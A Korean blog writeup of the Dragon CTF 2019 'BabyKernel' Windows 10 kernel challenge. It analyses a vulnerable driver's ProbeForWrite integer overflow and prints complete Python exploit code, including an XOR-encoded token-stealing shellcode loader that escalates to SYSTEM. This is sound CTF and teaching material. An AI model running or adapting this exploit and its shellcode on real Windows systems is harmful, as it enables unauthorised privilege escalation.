---
layout: "post"
title: "[Writeup] BabyKernel - Dragon CTF 2019"
date: "2020-01-11 02:00"
tag:
- kernel
headerImage: true
category: blog
author: y0ny0ns0n
---

작성 - y0ny0ns0n @ null2root

# 목차
1. [소개](#1-소개)
2. [환경 구축](#2-환경-구축)
3. [분석](#3-분석)
4. [익스플로잇](#4-익스플로잇)
5. [후기](#5-후기)
6. [참고자료](#6-참고자료)


# 1. 소개
요 몇달동안 해킹 관련 공부에 손을 떼고 있다가 잠시 시간이 나서 재활치료 느낌으로 간단한 Windows 10 커널 문제를 하나 풀어볼려고 합니다. 

처음에는 [Niklas Baumstark](https://twitter.com/_niklasb)이 WCTF 2018에서 출제했던 [searchme](https://github.com/niklasb/elgoog)라는 문제를 풀어볼려고 했었는데, 분석을 하면 할수록 [Mateusz Jurczyk의 writeup](https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/)에 소개된 방법과 다른 방식으로 접근하기 어려워 보였습니다. 그렇다면 이미 갓해커 한명이 잘 써놓은 writeup이 있는데 다른 attack vector나 새로운 접근을 하지도 않으면서 존재하는 지식을 되풀이 하는건 [너무 비생산적이라는 생각](https://en.wikipedia.org/wiki/Reinventing_the_wheel)이 들어, [Mateusz Jurczyk](https://twitter.com/j00ru)이 Dragon CTF 2019 본선에 출제했던 다른 문제를 골라봤습니다.


# 2. 환경 구축

가상머신: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
- Windows 10 Version 1809 (OS Build 17763.914)
- VMware Workstation Pro 15.5.1

문제파일: https://github.com/j00ru/ctf-tasks/tree/master/Dragon%20CTF%202019/Main%20event/BabyKernel/task

분석도구
- WinDbg Preview: https://www.microsoft.com/en-us/p/windbg-preview/9pgjgd53tn86
- VirtualKd-Redux: https://github.com/4d61726b/VirtualKD-Redux
- KePwnLib: https://github.com/y0ny0ns0n/my-playgrounds/blob/master/KePwnLib.py
- OSRLoader: https://www.osronline.com/OsrDown.cfm/osrloaderv30.zip


사용자가 **nt authority\system**이 아니면 flag파일을 읽을 수 없도록 수정
![disable normal access](/assets/images/babykernel-pic1.png)


# 3. 분석
우선 처음 봤을때 눈에 띄는 건 취약한 커널 드라이버 파일만 주는 일반적인 커널 문제들과는 다르게 커널 드라이버와 통신하는 클라이언트 실행 파일( **SecureClient.exe** )도 같이 준다는 점입니다.

![SecureClient execute](/assets/images/babykernel-pic2.png)

**SecureClient.exe**는 위와 같이 처음 시작 시 입력값을 요구합니다.

"**protect**"를 입력할 경우, 메시지를 입력하라고 하며 새로운 입력값을 요구하고 이를 입력해주면 메시지가 보호되었다는 문구와 함께 **user-mode buffer is now empty**라는 문구를 같이 출력합니다. 이 부분의 코드는 아래와 같습니다.

```c
// ....
sub_7FF7F67439D0(&qword_7FF7F67784C0, &user_msg, v13);
v15 = &user_msg;
if ( v39 >= 0x10 )
    v15 = user_msg;
sub_7FF7F674AC08(InBuffer, 4096i64, v15, 4096i64); // 입력받은 메시지를 InBuffer에 복사
DeviceIoControl(hDriver, 0x226203u, 0i64, 0, 0i64, 0, &BytesReturned, 0i64);
InBufferLen = -1i64;
do
    ++InBufferLen;
while ( InBuffer[InBufferLen] );
if ( DeviceIoControl(hDriver, 0x22620Bu, InBuffer, InBufferLen, 0i64, 0, &BytesReturned, 0i64) )
{
    LODWORD(v17) = cpp_cout(Format, "[+] Successfully protected message, user-mode buffer is now empty");
// ....
```

[DeviceIoControl()](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol) 함수는 [Buffered I/O](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-buffered-i-o) 통신을 사용하는 커널 드라이버와 통신하기 위해 사용하는 함수이며, 아래와 같이 입력값 버퍼( `lpInBuffer` ) 혹은 출력값 버퍼( `lpOutBuffer` )를 인자값으로 지정할 수 있습니다.

```cpp
BOOL DeviceIoControl(
    HANDLE       hDevice,
    DWORD        dwIoControlCode, // a.k.a IOCTL code
    LPVOID       lpInBuffer,
    DWORD        nInBufferSize,
    LPVOID       lpOutBuffer,
    DWORD        nOutBufferSize,
    LPDWORD      lpBytesReturned,
    LPOVERLAPPED lpOverlapped
);
```

위의 코드에선 총 2개의 IOCTL code( 0x226203, 0x22620B )를 사용합니다. 0x226203은 따로 입력값 혹은 출력값 버퍼를 지정해주지 않지만, 0x22620B는 사용자가 입력한 메시지( `InBuffer` )를 입력값 버퍼로 지정해주는데, 호출 이후 `InBuffer`에 보관되어있던 메시지는 `InBufferLen`만큼 NULL 바이트로 덮어씌워집니다.

"**unprotect**"를 입력할 경우, 위에서 보호했던 메시지를 수신했다고 출력합니다. 이 부분은 지엽적인 코드가 많아 아래와 같이 IOCTL 관련 부분만 봤습니다.

```c
// ....
DeviceIoControl(hDriver, 0x226207u, 0i64, 0, 0i64, 0, BytesReturned + 1, 0i64);
if ( !DeviceIoControl(hDriver, 0x22620Bu, InBuffer, 0x1000u, 0i64, 0, BytesReturned + 1, 0i64) )
{
    LODWORD(v26) = cpp_cout(Format, "[-] Unable to unprotect a message, aborting");
    // ....
}
LODWORD(v20) = cpp_cout(Format, "[+] Retrieved the following message: ");
LODWORD(v21) = cpp_cout(v20, InBuffer);
// ....
```

여기서도 2개의 IOCTL code( 0x226207, 0x22620B )를 사용합니다.

0x226207은 따로 입/출력값 버퍼를 지정해주지 않고 사용되며, 0x22620B는 여기서 다시 사용되는데 특이하게도 입력값 버퍼로 지정해 준 `InBuffer`에 커널 드라이버가 보호(?)중인 메시지를 넣습니다. 

이후 **unprotect**를 입력해 다시 한번 위의 코드를 실행하면 아무런 메시지를 출력하지 않는데 아마 **kernel-mode buffer**에 보관중이던 메시지도 IOCTL 통신 이후에 초기화된 것으로 보입니다.

아직 커널 드라이버 파일( **SecureDrv.sys** )을 분석하지 않은 상태에서 클라이언트 파일만 봤을 때, IOCTL 통신의 역할은 간단해 보입니다. 

0x226203은 사용자에게 입력받은 메시지를 커널 드라이버로 보내고( User-Land -> Kernel-Land ), 0x226207은 커널 드라이버에 보관중인 메시지를 받아서 출력합니다( Kernel-Land -> User-Land ). 

특기할 점은 양쪽 다 메시지를 보내고 나서 보낸쪽에서 현재 보관중인 메시지는 NULL 바이트로 초기화한다는 점과, 둘 다 0x22620B를 같이 사용한다는 점인데 여기서 0x22620B가 Kernel-Land와 User-Land간의 메시지 송/수신을 처리한다고 유추해볼 수 있습니다.

이제 **SecureDrv.sys**를 분석해 봅시다.

커널 드라이버의 entrypoint인 [DriverEntry()](https://docs.microsoft.com/en-us//windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers) 함수를 보면 Base Address는 다르겠지만 아래와 같은 구조의 함수를 찾을 수 있습니다.

```c
NTSTATUS __fastcall sub_FFFFF8030740123C(PDRIVER_OBJECT DriverObject)
{
    PDRIVER_OBJECT v1; // rbx
    NTSTATUS result; // eax
    UNICODE_STRING DestinationString; // [rsp+40h] [rbp-28h]
    UNICODE_STRING SymbolicLinkName; // [rsp+50h] [rbp-18h]

    v1 = DriverObject;
    DbgPrint("[+] SecureDrv: driver loaded\r\n");
    RtlInitUnicodeString(&DestinationString, L"\\Device\\SecureStorage");
    RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\SecureStorage");
    result = IoCreateDevice(v1, 0, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject);
    if ( result >= 0 )
    {
        IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
        memset64(v1->MajorFunction, just_return_STATUS_NOT_SUPPORTED, 0x1Bui64);
        v1->MajorFunction[14] = deviceControlHandler; // IRP_MJ_DEVICE_CONTROL
        v1->DriverUnload = driverUnloadHandler;
        qword_FFFFF80307403020 = 0i64;
        dword_FFFFF80307403028 = 0;
        FastMutex.Count = 1;
        KeInitializeEvent(&Event, SynchronizationEvent, 0);
        qword_FFFFF80307404050 = sub_FFFFF80307401130;
        DbgPrint("[+] SecureDrv: driver initialized\r\n");
        result = 0;
    }
    return result;
}
```

IOCTL 관련 루틴은 보통 [IRP_MJ_DEVICE_CONTROL](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control) 핸들러 함수안에 있기 때문에, 해당 핸들러 함수안을 보면 아래와 같이 간단한 구조의 IOCTL code 처리 루틴이 보입니다.

```c
v6 = v2->UserBuffer;
// ....
case 0x226203u:
    v8 = user_to_kernel_handler;
    goto LABEL_9;
case 0x226207u:
    v8 = kernel_to_user_handler;
LABEL_9:
    func_ptr = v8;
    break;
case 0x22620Bu:
    v7 = just_jmp_to_func_ptr(func_ptr); // jmp rax(=func_ptr)
    if ( v6 )
    {
        ProbeForWrite(v6, 8ui64, 1u);
        *v6 = v7;
    }
    break;
```

0x22620B는 다른 IOCTL code에서 지정해준 핸들러 함수를 실행하는게 기능의 전부였습니다. 실제 처리 루틴은 0x226203( `user_to_kernel_handler` )과 0x226607( `kernel_to_user_handler` )에 있기 때문에 저 핸들러 함수들을 분석해야 합니다.

```c
signed __int64 __fastcall user_to_kernel_handler(_BYTE *a1, unsigned int a2)
{
    _BYTE *user_msg; // rdi
    unsigned __int64 user_msg_len; // rsi

    user_msg = a1;
    if ( a2 > 0xFFF )                 // cmp     edx, 0FFFh
        return 0xFFFFFFFFC000000Di64; // STATUS_INVALID_PARAMETER
    user_msg_len = a2;
    ProbeForWrite(a1, a2, 1u);
    kmemcpy(kernel_msg, user_msg, user_msg_len);
    if ( user_msg_len >= 0x1000 )     // cmp     rsi, 1000h
        _report_rangecheckfailure();
    kernel_msg[user_msg_len] = 0;
    memset(user_msg, 0, user_msg_len);
    return 0i64;
}

__int64 __fastcall kernel_to_user_handler(_BYTE *a1, unsigned int a2)
{
    unsigned __int64 user_msg_len; // rbx
    _BYTE *user_msg; // r14
    unsigned __int64 kernel_msg_len; // rax

    user_msg_len = a2;
    user_msg = a1;
    ProbeForWrite(a1, a2 + 1, 1u); // lea     r8d, [rsi+1]
    kernel_msg_len = -1i64;
    do
      ++kernel_msg_len;
    while ( kernel_msg[kernel_msg_len] );
    if ( user_msg_len >= kernel_msg_len )
      user_msg_len = kernel_msg_len;
    memcpy(user_msg, kernel_msg, user_msg_len);
    user_msg[user_msg_len] = 0;
    memset(kernel_msg, 0, user_msg_len);
    return 0i64;
}
```

위의 코드들을 보시면 `user_to_kernel_handler()` 함수는 입력값 버퍼에서 메시지를 읽어들여 고정된 커널 메모리 영역에 삽입하는데, `kernel_to_user_handler()` 함수의 경우, 커널 메모리 영역에 보관된 메시지를 읽어들여 **입력값 버퍼**에 삽입합니다.

근데 **입력값 버퍼**는 `DeviceIoControl()`의 3번째 인자값이기 때문에 주소값을 원하는 대로 조작할 수 있습니다. 다만 `memcpy()` 함수로 값을 복사하기 전에 [ProbeForWrite()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforwrite) 함수로 입력값 버퍼의 주소가 실제 User-Land에 속하는 주소인지 검사합니다.

이 검사는 `kernel_to_user_handler()` 함수에서 `ProbeForWrite()` 함수의 2번째 인자값에 1을 더해서 호출하기 때문에, 하단의 코드처럼 입력값 버퍼의 크기를 0xFFFFFFFF로 지정해주면 Integer Overflow가 발생해 우회할 수 있습니다.

```python
from KePwnLib import *
import sys

BABY_IOCTL_CODE1 = 0x226203 # user -> kernel
BABY_IOCTL_CODE2 = 0x226207 # kernel -> user
BABY_IOCTL_CODE3 = 0x22620B # jmp to handler

DRIVER_NAME = "\\\\.\\SecureStorage"
DEVICE_NAME = "SecureDrv"

# edit for exploit
DeviceIoControl.argtypes = [
	HANDLE,
	DWORD,
	c_ulonglong, # LPVOID,
	DWORD,
	LPVOID,
	DWORD,
	POINTER(DWORD),
	LPVOID
]

hDriver = DriverConnect(DRIVER_NAME)
if hDriver == NULL:
	print "[!] cannot create kernel driver handler"
	sys.exit(-1)

print "[+] %s handler      = 0x%x" % (DRIVER_NAME, hDriver)
securedrv_addr = GetDeviceBase(DEVICE_NAME)
print "[+] %s base address = 0x%016x" % (DEVICE_NAME, securedrv_addr)

dwRet = DWORD(0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE1, NULL, 0, NULL, 0, byref(dwRet), 0)

buf = create_string_buffer(0x100)
memmove(buf, "A" * 8, 8)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, addressof(buf), 8, NULL, 0, byref(dwRet), 0)

DeviceIoControl(hDriver, BABY_IOCTL_CODE2, NULL, 0, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, securedrv_addr+0x4050, -1, NULL, 0, byref(dwRet), 0)

'''
SecureDrv+0x11e3:
fffff803`074311e3 ff153f0e0000    call    qword ptr [SecureDrv+0x2028 (fffff803`07432028)]
0: kd> r rcx,rdx,r8
rcx=fffff80307434050 rdx=0000000000000000 r8=0000000000000001
0: kd> dqs fffff803`07432028 l1
fffff803`07432028  fffff803`06868db0 nt!ProbeForWrite
....
SecureDrv+0x120d:
fffff803`0743120d e8ae010000      call    SecureDrv+0x13c0 (fffff803`074313c0) <- memcpy()
1: kd> r rcx,rdx,r8
rcx=fffff80307434050 rdx=fffff80307433050 r8=0000000000000008
1: kd> dqs @rdx l1
fffff803`07433050  41414141`41414141
'''
```

그런데 만약 이 취약점을 사용할 경우, `kernel_to_user_handler()`에서 `user_msg_len`의 값이 `0xFFFFFFFF`가 되기 때문에 항상 `kernel_msg_len`의 값이 `memcpy()` 함수의 3번째 인자로 사용됩니다. `kernel_msg_len`은 `kernel_msg`에 보관된 값이 문자열이라고 가정한 상태에서 길이를 계산하기 떄문에, 임의의 주소에 쓰고자 하는 값 중간에 NULL 바이트가 들어가지 않도록 유의해야 합니다. 

어쨌든 이제 AAW( Arbitrary Address Write )가 가능한 취약점을 찾았으니 본격적인 공격단계로 넘어가 보겠습니다.


# 4. 익스플로잇
분석 단계에서 설명드린 것처럼 취약점 자체는 간단하기 때문에, 익스플로잇 과정을 좀 더 상세하게 다뤄보겠습니다.

우선 Windows 10 커널엔 여러 mitigation들이 있는데, 그 중에서 제가 알고있는 것들을 나열해보면 다음과 같습니다:
- [0x0 주소 mapping](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/b91c324/Exploit/Common.c#L263-L302) 불가<br>
![null mapping failed](/assets/images/babykernel-pic3.png)

- [SMEP](https://en.wikipedia.org/wiki/Control_register#SMEP)로 인해 Kernel-Land( Ring-0 )에서 User-Land( Ring-3 )의 코드를 실행할 수 없음

- [NtQueryIntervalProfile()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProfile%2FNtQueryIntervalProfile.html)에서 `HalDispatchTable`에 보관된 주소값을 참조해 호출하는 부분에 [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)가 추가됨
```
0: kd> u nt!KeQueryIntervalProfile l10
nt!KeQueryIntervalProfile:
fffff803`068d3b74 4883ec58        sub     rsp,58h
fffff803`068d3b78 83f901          cmp     ecx,1
fffff803`068d3b7b 7436            je      nt!KeQueryIntervalProfile+0x3f (fffff803`068d3bb3)
fffff803`068d3b7d 488b0504e4d3ff  mov     rax,qword ptr [nt!HalDispatchTable+0x8 (fffff803`06611f88)]
fffff803`068d3b84 4c8d4c2460      lea     r9,[rsp+60h]
fffff803`068d3b89 ba18000000      mov     edx,18h
fffff803`068d3b8e 894c2430        mov     dword ptr [rsp+30h],ecx
fffff803`068d3b92 4c8d442430      lea     r8,[rsp+30h]
fffff803`068d3b97 8d4ae9          lea     ecx,[rdx-17h]
fffff803`068d3b9a e8e1e5afff      call    nt!guard_dispatch_icall (fffff803`063d2180)
....
```

- Integrity level이 low인 프로세스는 NtQuerySystemInformation(), EnumDeviceDrivers()와 같은 [KASLR Bypass에 사용될 수 있는 함수들을 호출할 수 없음](http://www.alex-ionescu.com/?p=82)

- ETC...

이외에도 더 있을텐데, 제가 아는 선에선 이게 끝입니다.

보통 Windows 커널 익스플로잇은 PID가 항상 4로 고정되어 있는 SYSTEM 프로세스의 [Token을 훔쳐오는 쉘코드를 실행하는 형태](https://blahcat.github.io/2017/08/14/a-primer-to-windows-x64-shellcoding/)로 이루어집니다. 

Token이란 [현재 프로세스 혹은 스레드의 권한을 정의하는 객체](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)를 의미하는데, 현재 Windows에 상에서 동작하는 모든 프로세스들은 [_EPROCESS 객체](https://www.nirsoft.net/kernel_struct/vista/EPROCESS.html)의 double linked list 형태로 관리되며 Token 역시 이 객체안에 보관됩니다. Windows 커널 익스플로잇을 위한 쉘코드는 이 `_EPROCESS` 객체의 double linked list를 순회하며 SYSTEM 프로세스를 찾는 방식으로 동작합니다.

저는 이미 KePwnLib.py에 `tokenStealingShellcoeForWin10_1809`란 이름으로 정의해둔 쉘코드를 사용했는데, 중간에 NULL가 들어가지 않도록 간단한 XOR encoder를 가지고 아래와 같은 익스플로잇 코드를 작성했습니다.

( 그리고 이유는 알 수 없지만, 분명 [NonPagedPool 객체 영역은 실행권한이 없다](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/no-execute-nonpaged-pool?redirectedfrom=MSDN)고 알고 있었는데 `ExAllocatePoolWithTag(NonPagedPool, 0x1000)`으로 할당한 영역에 RWX 권한이 있었습니다 )

```python
from KePwnLib import *
import sys

BABY_IOCTL_CODE1 = 0x226203 # user -> kernel
BABY_IOCTL_CODE2 = 0x226207 # kernel -> user
BABY_IOCTL_CODE3 = 0x22620B # jmp to handler

DRIVER_NAME = "\\\\.\\SecureStorage"
DEVICE_NAME = "SecureDrv"

ExAllocatePoolWithTag_offset = 0x348030
func_ptr_offset = 0x4050

# edit for exploit
DeviceIoControl.argtypes = [
	HANDLE,
	DWORD,
	c_ulonglong, # LPVOID,
	DWORD,
	LPVOID,
	DWORD,
	POINTER(DWORD),
	LPVOID
]

# for shellcode without NULL byte
def xored_shellcode(sc):
    xor_byte = 0
    for i in range(1, 256):
        xored_sc = "".join(chr(ord(x) ^ i) for x in sc)
        if "\x00" not in xored_sc:
            xor_byte = i
            break

    decoder = ""
    decoder += "\x48\x31\xc9" # xor rcx, rcx
    if len(xored_sc) < 0x100:
        decoder += "\xb1" + p8(len(xored_sc))      # mov cl, len(xored_sc)
    elif (len(xored_sc) & 0xFF) == 0:
        xored_sc += chr(0x90 ^ xor_byte)
        decoder += "\x66\xB9" + p16(len(xored_sc)) # mov cx, len(xored_sc)
    else:
        decoder += "\x66\xB9" + p16(len(xored_sc)) # mov cx, len(xored_sc)

    xor_start = len(pusha()) + len(decoder) + 14
    
    # decode_loop:
    decoder += "\x8a\x58" + p8(xor_start) # mov bl, byte ptr[rax+xor_start]
    decoder += "\x80\xf3" + p8(xor_byte)  # xor bl, xor_byte
    decoder += "\x88\x58" + p8(xor_start) # mov byte ptr[rax+xor_start], bl
    decoder += "\x48\xFF\xC0"             # inc rax
    decoder += "\xE2\xF2"                 # loop decode_loop
    
    
    result = ""
    result += "\x90"  # NonPagedPool object address always like 0xXXXX~00, need to terminate that NULL
    result += pusha() # pusha code for register backup before XOR decoding
    result += decoder
    result += xored_sc

    return result


hDriver = DriverConnect(DRIVER_NAME)
if hDriver == NULL:
	print "[!] cannot create kernel driver handler"
	sys.exit(-1)

print "[+] %s handler = 0x%x" % (DRIVER_NAME, hDriver)
securedrv_addr = GetDeviceBase(DEVICE_NAME)
print "[+] %s base address = 0x%016x" % (DEVICE_NAME, securedrv_addr)
allocpool_addr = GetKernelBase() + ExAllocatePoolWithTag_offset
print "[+] nt!ExAllocatePoolWithTag = 0x%016x" % (allocpool_addr)
func_ptr_addr = securedrv_addr + func_ptr_offset
print "[+] SecureDrv!func_ptr = 0x%016x" % func_ptr_addr

dwRet = DWORD(0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE1, NULL, 0, NULL, 0, byref(dwRet), 0)

buf = create_string_buffer(0x100)
memmove(buf, p64(allocpool_addr), 8)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, addressof(buf), 8, NULL, 0, byref(dwRet), 0)

DeviceIoControl(hDriver, BABY_IOCTL_CODE2, NULL, 0, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, func_ptr_addr, -1, NULL, 0, byref(dwRet), 0)

DeviceIoControl(hDriver, BABY_IOCTL_CODE3, 0, 0x1000, addressof(buf), 8, byref(dwRet), 0)
pool_addr = up64(buf[:8])
print "[+] NonPagedPool object = 0x%016x" % pool_addr

# write shellcode into NonPagedPool Object
shellcode = tokenStealingShellcodeForWin10_1809
shellcode = xored_shellcode(shellcode[len(pusha()):])
memmove(buf, shellcode, len(shellcode))
DeviceIoControl(hDriver, BABY_IOCTL_CODE1, NULL, 0, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, addressof(buf), len(shellcode), NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE2, NULL, 0, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, pool_addr, -1, NULL, 0, byref(dwRet), 0)

# jmp to overwritten NonPagedPool Object
raw_input("gogo? ")
memmove(buf, p64(pool_addr+1), 8) # plus 1 to terminate last NULL byte
DeviceIoControl(hDriver, BABY_IOCTL_CODE1, NULL, 0, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, addressof(buf), 8, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE2, NULL, 0, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, func_ptr_addr, -1, NULL, 0, byref(dwRet), 0)
DeviceIoControl(hDriver, BABY_IOCTL_CODE3, NULL, 0, NULL, 0, byref(dwRet), 0)

popCMD()

# python -m PyInstaller --onefile -a -n baby_exploit ex.py
```
![profit](/assets/images/babykernel-pic.gif)


# 5. 후기
취약점 자체는 매우 쉽고 금방 찾을 수 있는데다, [Write-What-Where](https://cwe.mitre.org/data/definitions/123.html)가 가능하기 때문에 익스플로잇도 그렇게 큰 수고를 들이지 않고 할 수 있었습니다.

제가 처음 Windows Kernel에 관심을 가지게 된건 사이버공격방어대회 2019( 통칭 CCE2019 ) 예선에서 **babywkernel**이란 Windows 7 커널 문제를 풀고나서 였습니다. 그 전까지는 To-Do 목록에 있는 [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)나 가끔 보면서 큰 관심을 가지지 않았었는데, 이게 문제로 나오니까 거의 하루종일 헤매긴 했지만 막상 풀어보니 재밌었습니다.

[익스플로잇 코드](https://gist.github.com/y0ny0ns0n/0155aa05b1f4ec40d8c3bd2eca7f0cc2)도 지금 보면 거의 대회종료시간 직전에 작성해서 reliable하지도 않고 2번째 실행하면 무조건 BSOD를 띄웁니다. 

그 뒤로 한동안 공부를 못하다 잠시 시간이 나서 이번에 간단한 문제를 하나 풀어봤는데 나름(?) 괜찮았습니다.

이 문제는 취약점이 너무 간단해 실제 비슷한 사례는 Real-World에 없겠지만, 다른 문서들을 보면 이제 공부를 시작한 입장으로서 여러 신기한 것들을 많이 찾을 수 있었습니다.

예를 들어,

1. [CreatePipe()](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)로 생성한 [Named Pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)에 값을 쓰면 NonPagedPool 객체에 들어간다 [link](http://www.alex-ionescu.com/?p=231).
2. `win32kbase!NtGdiDdDDIGetContextSchedulingPriority` 같이 상대적으로 잘 사용되지 않는 syscall 함수를 덮어씌워 사용할 수 있다 [link](https://gist.github.com/j00ru/2347cf937366e61598d1140c31262b18#file-wctf_2018_searchme_exploit-cpp-L394-L396).
3. `SEP_TOKEN_PRIVILEGES` 구조체를 덮어씌워 SYSTEM 권한을 가진 프로세스에 코드를 삽입할 수 있다 [link](https://labs.bluefrostsecurity.de/publications/2016/01/07/exploiting-cve-2014-4113-on-windows-8.1).
4. ETC...


TL;DR. Windows Kernel 생각보다 재밌습니다 ㅎ.


# 6. 참고자료

CVE-2019-1215( UAF in ws2ifsl.sys ) root-cause analysis on Windows 10 19H1 (1903) x64
- https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/

Windows kernel Heap Fengshui
- http://www.alex-ionescu.com/?p=231

KASLR Bypass Mitigations in Windows
- http://www.alex-ionescu.com/?p=82

WCTF2018 - searchme writeup
- https://j00ru.vexillium.org/2018/07/exploiting-a-windows-10-pagedpool-off-by-one/

Windows 10 kernel exploitation technique
- https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf

NonPagedPool and PagedPool
- https://techcommunity.microsoft.com/t5/windows-blog-archive/pushing-the-limits-of-windows-paged-and-nonpaged-pool/ba-p/723789